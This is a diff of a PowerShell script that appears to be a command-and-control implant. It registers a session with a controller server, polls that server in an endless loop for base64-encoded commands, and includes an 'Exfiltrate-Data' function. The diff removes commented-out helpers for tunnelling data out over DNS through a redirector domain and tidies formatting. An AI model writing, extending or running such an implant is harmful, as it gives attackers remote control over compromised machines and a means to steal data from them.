@@ -1,23 +1,11 @@
-#$dnsAddr = "127.0.0.1"
 $httpAddr = "http://127.0.0.1:8088"
-#$domain = "a.malgo-redirector.com"
 
 $chunkLength = 1024
-#$chunkLength = 80 - $domain.Length
-#if ($chunkLength % 2 -ne 0) {
-#    $chunkLength -= 1
-#}
 
 $sessionId = "d8524193-809d-4f36-b65c-9a48ead7258e"
 $projectId = "6ed44c13-1a72-4652-936e-d6799a487736"
 
-filter thx { ($_.ToCharArray() | % { "{0:X2}" -f [int]$_ }) -join "" }
-filter chunks($c) { $t = $_; 0..[math]::floor($t.length / $c) | % { $t.substring($c * $_, [math]::min($c, $t.length - $c * $_)) } } 
-filter dots($c) { ($_ -replace "([\w]{$c})", "`$1.").trim('.') } 
-
-function Get-Blob {
-    return -join ((65..90) + (97..122) | Get-Random -Count 4 | % { [char]$_ })
-}
+filter chunks($c) { $t = $_; 0..[math]::floor($t.length / $c) | % { $t.substring($c * $_, [math]::min($c, $t.length - $c * $_)) } }
 
 function Register-Session {
     [CmdletBinding()]
@@ -52,7 +40,7 @@ function Get-CommandDetails {
         [string]$stringOffset = $currentOffset
         $response = Invoke-RestMethod -Uri "$httpAddr/c/$commandID/$currentOffset" -Method GET
 
-#        $response = $response -join ""
+        #        $response = $response -join ""
         # decode response from base64
         $response = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($response))
 
@@ -106,7 +94,7 @@ function Exfiltrate-Data {
 }
 
 Register-Session -sessionID $sessionId -projectID $projectId
-while($true) {
+while ($true) {
     $cmd = Get-CommandInfo
     if ($cmd -eq "null" -or $cmd -eq "") {
         Write-Host "No command found"
